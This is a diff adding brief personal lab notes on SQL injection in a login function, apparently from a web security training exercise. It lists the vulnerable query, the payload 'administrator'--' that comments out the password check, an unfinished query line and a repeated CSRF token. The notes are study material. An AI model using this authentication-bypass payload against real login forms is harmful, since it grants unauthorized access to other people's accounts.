@@ -1,0 +1,16 @@
+LAB
+SQL INJECTION IN LOGIN FUNCTIONALITY
+
+Account - administrator
+
+SELECT * FROM users WHERE username = "" AND password = "";
+
+SELECT * FROM users WHERE username = "olajide " AND password = "olajide1234";
+
+SELECT * FROM users WHERE username = "administrator'--" AND password = "olajide1234";
+
+SELECT * FROM users WHERE username = "administrator;
+
+First CSRF
+36kx4c8AJMhqx9KpN1kBvgafMTCF4ri0
+36kx4c8AJMhqx9KpN1kBvgafMTCF4ri0
